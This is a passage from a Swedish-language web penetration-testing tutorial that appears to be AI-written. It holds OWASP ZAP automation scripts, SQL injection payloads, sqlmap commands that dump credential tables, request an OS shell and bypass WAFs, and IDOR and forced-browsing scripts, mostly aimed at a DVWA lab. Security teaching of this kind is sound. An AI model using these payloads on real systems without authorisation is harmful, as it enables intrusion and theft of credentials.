        sensitive_keywords = ['password', 'api', 'key', 'secret', 'token', 'admin', 'debug']

        for msg in messages:
            msg_id = msg['id']
            response_body = zap.core.message(msg_id)['responseBody']

            comments = comment_pattern.findall(response_body)

            for comment in comments:
                for keyword in sensitive_keywords:
                    if keyword.lower() in comment.lower():
                        vuln = {
                            'type': 'Information Disclosure',
                            'url': msg['url'],
                            'description': f'Sensitive keyword "{keyword}" found in HTML comment',
                            'evidence': comment[:100],
                            'risk': 'Low'
                        }
                        self.vulnerabilities.append(vuln)
                        print(f"    [!] Found at {msg['url']}: {keyword}")

    def find_debug_endpoints(self):
        """Find potentially dangerous debug endpoints"""

        print("[*] Scanning for debug endpoints...")

        debug_paths = [
            '/debug', '/test', '/admin', '/phpinfo.php',
            '/server-status', '/server-info', '/.env',
            '/config.php', '/configuration.php'
        ]

        for path in debug_paths:
            test_url = f"{self.target}{path}"

            # Send request through ZAP
            try:
                zap.core.access_url(test_url, followredirects=False)
                time.sleep(0.5)

                # Check response
                messages = zap.core.messages(baseurl=test_url)
                if messages:
                    last_msg = messages[-1]
                    if '200' in last_msg['responseHeader']:
                        vuln = {
                            'type': 'Debug Endpoint Exposed',
                            'url': test_url,
                            'description': f'Debug/sensitive endpoint accessible: {path}',
                            'risk': 'Medium'
                        }
                        self.vulnerabilities.append(vuln)
                        print(f"    [!] Found: {test_url}")

            except:
                pass

    def check_security_headers(self):
        """Check for missing security headers"""

        print("[*] Checking security headers...")

        required_headers = {
            'X-Frame-Options': 'Clickjacking protection',
            'X-Content-Type-Options': 'MIME-sniffing protection',
            'X-XSS-Protection': 'XSS protection',
            'Strict-Transport-Security': 'HTTPS enforcement',
            'Content-Security-Policy': 'Content injection protection'
        }

        messages = zap.core.messages(baseurl=self.target)

        if messages:
            # Check first response
            first_msg = zap.core.message(messages[0]['id'])
            response_headers = first_msg['responseHeader']

            for header, purpose in required_headers.items():
                if header.lower() not in response_headers.lower():
                    vuln = {
                        'type': 'Missing Security Header',
                        'url': self.target,
                        'description': f'Missing {header} header ({purpose})',
                        'risk': 'Low'
                    }
                    self.vulnerabilities.append(vuln)
                    print(f"    [!] Missing: {header}")

    def generate_custom_report(self):
        """Generate report of custom findings"""

        print(f"\n\n{'='*70}")
        print("CUSTOM VULNERABILITY SCAN REPORT")
        print(f"{'='*70}")
        print(f"Target: {self.target}")
        print(f"Total Custom Findings: {len(self.vulnerabilities)}")
        print(f"{'='*70}\n")

        # Group by risk
        by_risk = {}
        for vuln in self.vulnerabilities:
            risk = vuln['risk']
            if risk not in by_risk:
                by_risk[risk] = []
            by_risk[risk].append(vuln)

        # Print each risk level
        for risk in ['High', 'Medium', 'Low']:
            if risk in by_risk:
                print(f"\n{risk.upper()} RISK ({len(by_risk[risk])}):")
                print("-" * 70)

                for vuln in by_risk[risk]:
                    print(f"\nType: {vuln['type']}")
                    print(f"URL: {vuln['url']}")
                    print(f"Description: {vuln['description']}")
                    if 'evidence' in vuln:
                        print(f"Evidence: {vuln['evidence']}")
                    print()

if __name__ == "__main__":
    target = "http://localhost"

    # First, spider the target
    print("[*] Spidering target first...")
    spider_id = zap.spider.scan(target)
    while int(zap.spider.status(spider_id)) < 100:
        time.sleep(2)

    print("[+] Spider complete\n")

    # Run custom scanner
    scanner = CustomVulnerabilityScanner(target)
    scanner.find_comments_in_source()
    scanner.find_debug_endpoints()
    scanner.check_security_headers()

    # Generate report
    scanner.generate_custom_report()
```

### 🚀 Python Exempel 7: Complete Automated Scan Pipeline

```python
#!/usr/bin/env python3
"""
ZAP API Example 7: Complete Automated Scan Pipeline
Full workflow: Spider → Passive Scan → Active Scan → Report
"""

from zapv2 import ZAPv2
import time
from datetime import datetime
import argparse

class ZAPAutomatedScanner:
    """Complete automated ZAP scanning pipeline"""

    def __init__(self, target_url, api_key='CHANGEME'):
        self.target = target_url
        self.zap = ZAPv2(
            apikey=api_key,
            proxies={
                'http': 'http://localhost:8080',
                'https': 'http://localhost:8080'
            }
        )
        self.scan_start_time = None
        self.scan_end_time = None

    def initialize(self):
        """Initialize scan - clear previous data"""
        print(f"[*] Initializing scan for {self.target}")
        print(f"[*] ZAP Version: {self.zap.core.version}")

        # New session
        self.zap.core.new_session(name=f"scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}")

        print("[+] New session created")
        self.scan_start_time = datetime.now()

    def spider_scan(self, max_depth=5):
        """Step 1: Spider the target"""
        print(f"\n{'='*70}")
        print("STEP 1: SPIDERING")
        print(f"{'='*70}")

        print(f"[*] Starting spider on {self.target}")
        print(f"    Max depth: {max_depth}")

        spider_id = self.zap.spider.scan(self.target, maxdepth=max_depth)

        # Monitor progress
        while int(self.zap.spider.status(spider_id)) < 100:
            progress = int(self.zap.spider.status(spider_id))
            print(f"    Spider progress: {progress}%", end='\r')
            time.sleep(2)

        print(f"\n[+] Spider completed!")

        # Get results
        urls_found = self.zap.spider.results(spider_id)
        print(f"[+] URLs discovered: {len(urls_found)}")

        return urls_found

    def passive_scan_wait(self):
        """Step 2: Wait for passive scan to complete"""
        print(f"\n{'='*70}")
        print("STEP 2: PASSIVE SCANNING")
        print(f"{'='*70}")

        print("[*] Waiting for passive scan to complete...")

        # Passive scan runs automatically as spider discovers URLs
        while int(self.zap.pscan.records_to_scan) > 0:
            remaining = int(self.zap.pscan.records_to_scan)
            print(f"    Records remaining: {remaining}", end='\r')
            time.sleep(2)

        print(f"\n[+] Passive scan completed!")

    def active_scan(self, policy=None):
        """Step 3: Active scan"""
        print(f"\n{'='*70}")
        print("STEP 3: ACTIVE SCANNING")
        print(f"{'='*70}")

        print(f"[*] Starting active scan on {self.target}")

        if policy:
            print(f"    Using policy: {policy}")
            scan_id = self.zap.ascan.scan(self.target, scanpolicyname=policy)
        else:
            scan_id = self.zap.ascan.scan(self.target)

        # Monitor progress
        while int(self.zap.ascan.status(scan_id)) < 100:
            progress = int(self.zap.ascan.status(scan_id))
            print(f"    Active scan progress: {progress}%", end='\r')
            time.sleep(5)

        print(f"\n[+] Active scan completed!")

        return scan_id

    def analyze_results(self):
        """Step 4: Analyze and display results"""
        print(f"\n{'='*70}")
        print("STEP 4: ANALYZING RESULTS")
        print(f"{'='*70}")

        alerts = self.zap.core.alerts()

        # Group by risk
        by_risk = {
            'High': [],
            'Medium': [],
            'Low': [],
            'Informational': []
        }

        for alert in alerts:
            by_risk[alert['risk']].append(alert)

        print(f"\n[*] Total Alerts: {len(alerts)}")
        print(f"\n[*] Risk Breakdown:")
        print(f"    🔴 High:          {len(by_risk['High'])}")
        print(f"    🟠 Medium:        {len(by_risk['Medium'])}")
        print(f"    🟡 Low:           {len(by_risk['Low'])}")
        print(f"    ℹ️  Informational: {len(by_risk['Informational'])}")

        # Print high-risk alerts
        if by_risk['High']:
            print(f"\n[!] HIGH RISK ALERTS:")
            for alert in by_risk['High']:
                print(f"\n    - {alert['alert']}")
                print(f"      URL: {alert['url']}")
                print(f"      Confidence: {alert['confidence']}")

        return alerts, by_risk

    def generate_reports(self, output_dir="."):
        """Step 5: Generate reports"""
        print(f"\n{'='*70}")
        print("STEP 5: GENERATING REPORTS")
        print(f"{'='*70}")

        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        base_name = f"{output_dir}/zap_scan_{timestamp}"

        # HTML Report
        html_file = f"{base_name}.html"
        with open(html_file, 'w') as f:
            f.write(self.zap.core.htmlreport())
        print(f"[+] HTML report: {html_file}")

        # XML Report
        xml_file = f"{base_name}.xml"
        with open(xml_file, 'w') as f:
            f.write(self.zap.core.xmlreport())
        print(f"[+] XML report: {xml_file}")

        # JSON Report
        import json
        json_file = f"{base_name}.json"
        with open(json_file, 'w') as f:
            json.dump(self.zap.core.alerts(), f, indent=2)
        print(f"[+] JSON report: {json_file}")

        return {
            'html': html_file,
            'xml': xml_file,
            'json': json_file
        }

    def print_summary(self, alerts, reports):
        """Print final summary"""
        self.scan_end_time = datetime.now()
        duration = self.scan_end_time - self.scan_start_time

        print(f"\n{'='*70}")
        print("SCAN COMPLETE - SUMMARY")
        print(f"{'='*70}")
        print(f"Target: {self.target}")
        print(f"Start Time: {self.scan_start_time.strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"End Time: {self.scan_end_time.strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"Duration: {duration}")
        print(f"\nTotal Alerts: {len(alerts)}")
        print(f"\nReports Generated:")
        for format_type, filepath in reports.items():
            print(f"  {format_type.upper()}: {filepath}")
        print(f"{'='*70}")

    def run_full_scan(self):
        """Run complete automated scan"""
        try:
            # Initialize
            self.initialize()

            # Step 1: Spider
            urls = self.spider_scan()

            # Step 2: Passive Scan
            self.passive_scan_wait()

            # Step 3: Active Scan
            self.active_scan()

            # Step 4: Analyze
            alerts, by_risk = self.analyze_results()

            # Step 5: Generate Reports
            reports = self.generate_reports()

            # Summary
            self.print_summary(alerts, reports)

            return True

        except Exception as e:
            print(f"\n[!] Error during scan: {e}")
            import traceback
            traceback.print_exc()
            return False

def main():
    parser = argparse.ArgumentParser(description='ZAP Automated Scanner')
    parser.add_argument('-t', '--target', required=True, help='Target URL')
    parser.add_argument('-k', '--api-key', default='CHANGEME', help='ZAP API Key')
    parser.add_argument('-o', '--output-dir', default='.', help='Output directory for reports')

    args = parser.parse_args()

    # Run scanner
    scanner = ZAPAutomatedScanner(args.target, api_key=args.api_key)
    success = scanner.run_full_scan()

    if success:
        print("\n[+] Scan completed successfully!")
    else:
        print("\n[!] Scan failed!")

if __name__ == "__main__":
    main()
```

**Användning:**
```bash
# Make sure ZAP is running in daemon mode first:
zap.sh -daemon -port 8080 -config api.key=CHANGEME

# Then run the automated scanner:
python3 zap_automated_scanner.py -t http://localhost -k CHANGEME

# With custom output directory:
python3 zap_automated_scanner.py -t http://localhost -k CHANGEME -o /tmp/zap_reports
```

---

## 🔐 Del 4: OWASP Top 10 Testing med ZAP

Nu går vi igenom hur man testar för de 10 vanligaste sårbarheterna enligt OWASP.

### 📊 OWASP Top 10 (2021)

```
OWASP TOP 10 - 2021
═══════════════════════════════════════════════════════════════

A01:2021 – Broken Access Control
A02:2021 – Cryptographic Failures
A03:2021 – Injection
A04:2021 – Insecure Design
A05:2021 – Security Misconfiguration
A06:2021 – Vulnerable and Outdated Components
A07:2021 – Identification and Authentication Failures
A08:2021 – Software and Data Integrity Failures
A09:2021 – Security Logging and Monitoring Failures
A10:2021 – Server-Side Request Forgery (SSRF)
```

### 🎯 A03: Injection (SQL Injection Deep-Dive)

SQL Injection är en av de mest farliga sårbarheterna!

#### Manual SQL Injection Testing

**Scenario:** DVWA → SQL Injection (Security: Low)

**Test 1: Basic Detection**
```sql
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'#
' OR '1'='1'/*
```

**Test 2: Confirm Injection**
```sql
1' AND '1'='1'--   (Should work)
1' AND '1'='2'--   (Should fail)
```

**Test 3: Enumerate Database**
```sql
' UNION SELECT NULL--
' UNION SELECT NULL, NULL--
' UNION SELECT NULL, NULL, NULL--
...until it works (finds number of columns)
```

**Test 4: Extract Data**
```sql
' UNION SELECT table_name, NULL FROM information_schema.tables--
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT user, password FROM users--
```

#### SQLmap - Automated SQL Injection

**Installation:**
```bash
# Kali (förinstallerad)
sqlmap

# Ubuntu/Mac
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git
cd sqlmap
python sqlmap.py
```

**Basic Usage:**
```bash
# Test URL for SQLi
sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=YOUR_SESSION"

# Dump database names
sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="security=low; PHPSESSID=YOUR_SESSION" \
  --dbs

# Dump specific database
sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="security=low; PHPSESSID=YOUR_SESSION" \
  -D dvwa --tables

# Dump users table
sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="security=low; PHPSESSID=YOUR_SESSION" \
  -D dvwa -T users --dump

# Get OS shell (if possible!)
sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="security=low; PHPSESSID=YOUR_SESSION" \
  --os-shell
```

**Advanced SQLmap:**
```bash
# POST request
sqlmap -u "http://localhost/login.php" \
  --data="username=admin&password=test" \
  -p username

# From Burp/ZAP request file
sqlmap -r request.txt

# Tamper scripts (WAF bypass)
sqlmap -u "http://target.com/page?id=1" \
  --tamper=space2comment,between

# Batch mode (no prompts)
sqlmap -u "http://target.com/page?id=1" --batch

# Aggressive testing
sqlmap -u "http://target.com/page?id=1" --level=5 --risk=3
```

#### Python Script: Automated SQLi Testing with ZAP

```python
#!/usr/bin/env python3
"""
Automated SQL Injection Testing with ZAP API
"""

from zapv2 import ZAPv2
import time

ZAP_API_KEY = 'CHANGEME'
zap = ZAPv2(apikey=ZAP_API_KEY, proxies={'http': 'http://localhost:8080', 'https': 'http://localhost:8080'})

def test_sql_injection(target_url):
    """Test for SQL Injection vulnerabilities"""

    print(f"[*] Testing SQL Injection on {target_url}")

    # First, access the URL to capture it
    zap.core.access_url(target_url)
    time.sleep(2)

    # Get the message ID
    messages = zap.core.messages(baseurl=target_url)
    if not messages:
        print("[!] No messages found")
        return

    msg_id = messages[0]['id']

    # Run SQL Injection scanner
    print("[*] Running SQL Injection scanner...")

    # Scanner IDs for SQL Injection:
    # 40018 = SQL Injection
    # 40019 = SQL Injection - MySQL
    # 40020 = SQL Injection - Hypersonic SQL
    # 40021 = SQL Injection - Oracle
    # 40022 = SQL Injection - PostgreSQL

    scan_id = zap.ascan.scan(target_url, scanpolicyname='SQL-Injection-Only')

    # Monitor
    while int(zap.ascan.status(scan_id)) < 100:
        progress = int(zap.ascan.status(scan_id))
        print(f"    Progress: {progress}%", end='\r')
        time.sleep(2)

    print("\n[+] Scan complete!")

    # Get SQL Injection alerts
    all_alerts = zap.core.alerts(baseurl=target_url)
    sqli_alerts = [a for a in all_alerts if 'SQL' in a['alert']]

    print(f"\n[*] SQL Injection Alerts: {len(sqli_alerts)}")

    for alert in sqli_alerts:
        print(f"\n  Alert: {alert['alert']}")
        print(f"  URL: {alert['url']}")
        print(f"  Parameter: {alert.get('param', 'N/A')}")
        print(f"  Attack: {alert.get('attack', 'N/A')}")
        print(f"  Evidence: {alert.get('evidence', 'N/A')[:100]}")

    return sqli_alerts

if __name__ == "__main__":
    # Test DVWA SQL Injection page
    target = "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit"
    test_sql_injection(target)
```

### 🎯 A01: Broken Access Control

**Testmetoder:**

```python
#!/usr/bin/env python3
"""
Test for Broken Access Control
"""

import requests

def test_idor(base_url, session_cookie):
    """Test for Insecure Direct Object Reference (IDOR)"""

    print("[*] Testing for IDOR...")

    # Try accessing other users' data
    for user_id in range(1, 20):
        url = f"{base_url}/user/profile?id={user_id}"

        response = requests.get(
            url,
            cookies={'PHPSESSID': session_cookie}
        )

        if response.status_code == 200:
            print(f"    [+] Accessible: User ID {user_id}")

            # Check if it's actually different users
            if 'admin' in response.text.lower() and user_id != 1:
                print(f"        [!] IDOR FOUND! Accessed admin from ID {user_id}")

def test_forced_browsing(base_url, session_cookie):
    """Test for forced browsing to admin pages"""

    print("[*] Testing forced browsing...")

    admin_paths = [
        '/admin',
        '/administrator',
        '/admin.php',
        '/admin/index.php',
        '/admin/dashboard',
        '/management',
        '/controlpanel'
    ]

    for path in admin_paths:
        url = f"{base_url}{path}"

        response = requests.get(
            url,
            cookies={'PHPSESSID': session_cookie},
            allow_redirects=False
        )

        if response.status_code == 200:
            print(f"    [+] Accessible: {path}")
            print(f"        [!] BROKEN ACCESS CONTROL FOUND!")

if __name__ == "__main__":
    base_url = "http://localhost"
    session = "your_session_cookie_here"

    test_idor(base_url, session)
    test_forced_browsing(base_url, session)
```

---

*[Fortsättning följer med övningar 4.1-4.7 och stort projekt...]*

Vill du att jag fortsätter med resten av Nivå 4? Det kommer att inkludera:
- CSRF testing
- XXE (XML External Entity)
- Command Injection
- WAF bypass-tekniker
- 7 detaljerade övningar
- Stort projekt: Fullständig säkerhetsaudit av webbapplikation

Ska jag fortsätta?